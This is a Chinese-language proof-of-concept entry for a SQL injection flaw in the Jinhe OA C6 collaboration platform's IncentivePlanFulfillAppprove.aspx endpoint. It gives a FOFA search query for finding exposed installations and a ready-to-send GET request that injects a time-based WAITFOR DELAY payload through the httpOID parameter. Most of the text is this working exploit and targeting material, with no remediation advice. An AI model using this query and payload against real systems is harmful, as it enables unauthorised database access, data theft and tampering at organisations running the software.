# 金和OA-C6系统接口IncentivePlanFulfillAppprove.aspx存在SQL注入漏洞

金和oa协同管理平台（又称金和C6协调管理平台），共有20多个应用模块，160多个应用子模块，涉及的企业管理业务包括协同办公管理、人力资源管理、项目管理、客户关系管理、企业目标管理、费用管理等多个业务范围。该系统存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。

## fofa

```javascript
app="金和网络-金和OA"
```

## poc

```javascript
GET /C6/JHSoft.Web.IncentivePlan/IncentivePlanFulfillAppprove.aspx/?httpOID=1;WAITFOR+DELAY+'0:0:2'-- HTTP/1.1
Host: 
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502131412695.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s/QvQXcg1UeNzILoY7n8c57g